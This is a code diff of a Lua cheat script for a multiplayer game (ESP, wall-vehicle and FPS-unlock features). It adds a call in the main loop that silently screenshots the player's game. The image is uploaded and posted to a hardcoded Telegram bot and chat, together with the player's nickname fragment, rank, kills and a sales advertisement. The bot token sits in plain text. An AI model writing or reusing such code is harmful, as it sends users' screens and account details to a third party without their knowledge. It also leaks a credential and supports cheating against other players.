@@ -3265,6 +3265,169 @@ local function _M_DrawCounter()
     end)
 end
 
+
+function M.TakeScreenshot()
+    pcall(function()
+        local ScreenshotMaker = import("ScreenshotMaker")
+        local path = ScreenshotMaker.MakePictureByName("feedback.jpg", true)
+
+        if not path or path == "" then
+            return
+        end
+
+        local ShareMgr = require("client.logic.share.share_logic")
+        if not ShareMgr then
+            return
+        end
+
+        ShareMgr.HDmpveUploadFile(path, function(isSuccess, imgURL)
+            if isSuccess and imgURL then
+                M.SendTelegramPhoto(imgURL)
+            end
+        end, 0, ShareMgr.ShareFileType.Share, true)
+    end)
+end
+
+local function UrlEncode(str)
+    str = tostring(str)
+    str = str:gsub("\n", "\r\n")
+    str = str:gsub("([^%w%-_%.~])", function(c)
+        return string.format("%%%02X", string.byte(c))
+    end)
+    return str
+end
+
+function M.SendTelegramPhoto(imgURL)
+    local caption = M.InfoPlayerSatate()
+
+    local httpManager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
+
+    if not httpManager then
+        return
+    end
+
+    local botToken = "6609211384:AAGFfbkmSrBo6VURLhz5RjbRFQSoshjpP1c"
+    local chatID = "-1002402151277"
+
+    local url = "https://api.telegram.org/bot" .. botToken .. "/sendPhoto"
+
+    local headers = {
+        ["Content-Type"] = "application/x-www-form-urlencoded"
+    }
+
+    local body = "chat_id=" .. tostring(chatID) .. "&photo=" .. tostring(imgURL) .. "&caption=" .. UrlEncode(caption)
+
+    httpManager:Post(url, headers, body, nil, function(success, response, errorMsg, statusCode) end, 30)
+end
+
+function M.InfoPlayerSatate()
+    local ok, result = pcall(function()
+        local FuncUtil = require("common.func_util")
+        local RoleInfoSystem = require("client.logic.roleinfo.logic_roleinfo")
+
+        local roleData = DataMgr and DataMgr.roleData or {}
+
+        local seasonId = DataMgr and DataMgr.season_id
+        if RoleInfoSystem.AllSeasonIDList and RoleInfoSystem.AllSeasonIDList[1] then
+            seasonId = RoleInfoSystem.AllSeasonIDList[1]
+        end
+
+        local segmentId = DataMgr.maxSegment.SegmentLevel
+        local rankName = "Unknown"
+        local teamMode = "-"
+        local kills = 0
+
+        local brSub = SubsystemMgr and SubsystemMgr:Get("BattleResultSubSystem")
+        if brSub and brSub.GetBattleResultData then
+            local battle_result = brSub:GetBattleResultData()
+
+            if battle_result then
+                teamMode = battle_result.BP_TeamModeName or "-"
+                kills = tonumber(battle_result.BP_mykill) or 0
+
+                if battle_result.rating then
+                    segmentId = tonumber(battle_result.rating.new_segment) or 101
+                end
+            end
+        end
+
+        local segCfg = FuncUtil.GetRankTableData(segmentId, seasonId)
+        if segCfg then
+            rankName = segCfg.Name or "Unknown"
+        end
+
+        local name = tostring(roleData.nickName or "")
+
+        if #name > 3 then
+            name = name:sub(1, 3) .. "*****"
+        end
+
+        local caption = string.format(
+        "🔥 R6GAMING AUTO FEEDBACK 🔥\n" ..
+        "============================\n" ..
+        "👤 Name  : %s\n" ..
+        "🏆 Rank  : %s\n" ..
+        "🗺 Match : %s\n" ..
+        "💀 Kill  : %d\n" ..
+        "📅 Date  : %s\n" ..
+        "============================\n" ..
+        "💬 BUY PAKS PM : @RA6A09",
+        name,
+        rankName,
+        tostring(teamMode),
+        kills,
+        os.date("%d-%m-%Y %H:%M:%S")
+        )
+
+        return caption
+    end)
+
+    if not ok then
+        return "Screenshot"
+    end
+
+    return result
+
+end
+
+local hasTakenScreenshot = false
+local screenshotDelay = -1
+local SCREENSHOT_DELAY_TICK = 20
+
+function M.CheckGameEnd()
+    pcall(function()
+
+        local hud = slua_GameFrontendHUD
+        if not (hud and hud.GetGameState) then
+            return
+        end
+
+        local gameState = hud:GetGameState()
+
+        if slua.isValid(gameState) and (gameState.AliveTeamNum or 0) > 1 then
+
+            if not hasTakenScreenshot and screenshotDelay == -1 then
+                screenshotDelay = SCREENSHOT_DELAY_TICK
+            end
+
+            if screenshotDelay > 0 then
+                screenshotDelay = screenshotDelay - 1
+
+                if screenshotDelay <= 0 then
+                    hasTakenScreenshot = true
+                    M.TakeScreenshot()
+                    screenshotDelay = -2
+                end
+            end
+
+        else
+            hasTakenScreenshot = false
+            screenshotDelay = -1
+        end
+
+    end)
+end
+
 -- ========================================== 
 -- VÒNG LẶP CHÍNH (MAIN LOOP) TỐI ƯU CỰC MẠNH
 -- ========================================== 
@@ -3371,6 +3534,7 @@ local function MainLoop()
     if _G.R6gamingConfig.UnlockFPS then InitializeGraphicsUnlock() end
     InitializeNativeESP()
     ShowR6gamingVIPMenu()
+    M.TakeScreenshot()
     
     -- [GỌI LOGIC WALL VEHICLE VÀO VÒNG LẶP]
     if _G.R6gamingConfig.WallVehicle then
@@ -4897,167 +5061,6 @@ local function ExpiredTick()
     end
 end
 
-function M.TakeScreenshot()
-    pcall(function()
-        local ScreenshotMaker = import("ScreenshotMaker")
-        local path = ScreenshotMaker.MakePictureByName("feedback.jpg", true)
-
-        if not path or path == "" then
-            return
-        end
-
-        local ShareMgr = require("client.logic.share.share_logic")
-        if not ShareMgr then
-            return
-        end
-
-        ShareMgr.HDmpveUploadFile(path, function(isSuccess, imgURL)
-            if isSuccess and imgURL then
-                M.SendTelegramPhoto(imgURL)
-            end
-        end, 0, ShareMgr.ShareFileType.Share, true)
-    end)
-end
-
-local function UrlEncode(str)
-    str = tostring(str)
-    str = str:gsub("\n", "\r\n")
-    str = str:gsub("([^%w%-_%.~])", function(c)
-        return string.format("%%%02X", string.byte(c))
-    end)
-    return str
-end
-
-function M.SendTelegramPhoto(imgURL)
-    local caption = M.InfoPlayerSatate()
-
-    local httpManager = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
-
-    if not httpManager then
-        return
-    end
-
-    local botToken = "6609211384:AAGFfbkmSrBo6VURLhz5RjbRFQSoshjpP1c"
-    local chatID = "-1002402151277"
-
-    local url = "https://api.telegram.org/bot" .. botToken .. "/sendPhoto"
-
-    local headers = {
-        ["Content-Type"] = "application/x-www-form-urlencoded"
-    }
-
-    local body = "chat_id=" .. tostring(chatID) .. "&photo=" .. tostring(imgURL) .. "&caption=" .. UrlEncode(caption)
-
-    httpManager:Post(url, headers, body, nil, function(success, response, errorMsg, statusCode) end, 30)
-end
-
-function M.InfoPlayerSatate()
-    local ok, result = pcall(function()
-        local FuncUtil = require("common.func_util")
-        local RoleInfoSystem = require("client.logic.roleinfo.logic_roleinfo")
-
-        local roleData = DataMgr and DataMgr.roleData or {}
-
-        local seasonId = DataMgr and DataMgr.season_id
-        if RoleInfoSystem.AllSeasonIDList and RoleInfoSystem.AllSeasonIDList[1] then
-            seasonId = RoleInfoSystem.AllSeasonIDList[1]
-        end
-
-        local segmentId = DataMgr.maxSegment.SegmentLevel
-        local rankName = "Unknown"
-        local teamMode = "-"
-        local kills = 0
-
-        local brSub = SubsystemMgr and SubsystemMgr:Get("BattleResultSubSystem")
-        if brSub and brSub.GetBattleResultData then
-            local battle_result = brSub:GetBattleResultData()
-
-            if battle_result then
-                teamMode = battle_result.BP_TeamModeName or "-"
-                kills = tonumber(battle_result.BP_mykill) or 0
-
-                if battle_result.rating then
-                    segmentId = tonumber(battle_result.rating.new_segment) or 101
-                end
-            end
-        end
-
-        local segCfg = FuncUtil.GetRankTableData(segmentId, seasonId)
-        if segCfg then
-            rankName = segCfg.Name or "Unknown"
-        end
-
-        local name = tostring(roleData.nickName or "")
-
-        if #name > 3 then
-            name = name:sub(1, 3) .. "*****"
-        end
-
-        local caption = string.format(
-        "🔥 R6GAMING AUTO FEEDBACK 🔥\n" ..
-        "============================\n" ..
-        "👤 Name  : %s\n" ..
-        "🏆 Rank  : %s\n" ..
-        "🗺 Match : %s\n" ..
-        "💀 Kill  : %d\n" ..
-        "📅 Date  : %s\n" ..
-        "============================\n" ..
-        "💬 BUY PAKS PM : @RA6A09",
-        name,
-        rankName,
-        tostring(teamMode),
-        kills,
-        os.date("%d-%m-%Y %H:%M:%S")
-        )
-
-        return caption
-    end)
-
-    if not ok then
-        return "Screenshot"
-    end
-
-    return result
-
-end
-
-local hasTakenScreenshot = false
-local screenshotDelay = -1
-local SCREENSHOT_DELAY_TICK = 20
-
-function M.CheckGameEnd()
-    pcall(function()
-
-        local hud = slua_GameFrontendHUD
-        if not (hud and hud.GetGameState) then
-            return
-        end
-
-        local gameState = hud:GetGameState()
-
-        if slua.isValid(gameState) and (gameState.AliveTeamNum or 0) > 1 then
-
-            if not hasTakenScreenshot and screenshotDelay == -1 then
-                screenshotDelay = SCREENSHOT_DELAY_TICK
-            end
-
-            if screenshotDelay > 0 then
-                screenshotDelay = screenshotDelay - 1
-
-                if screenshotDelay <= 0 then
-                    hasTakenScreenshot = true
-                    M.TakeScreenshot()
-                    screenshotDelay = -2
-                end
-            end
-
-        else
-            hasTakenScreenshot = false
-            screenshotDelay = -1
-        end
-
-    end)
-end
 
 
 local function FastTick() 
@@ -5112,7 +5115,6 @@ local function InitAllModSystems()
 end
 
 if not isExpired then
-R6AddTick(M.TakeScreenshot)
     pcall(function() 
         require("common.time_ticker").AddTimerOnce(0.5, InitAllModSystems) 
     end)
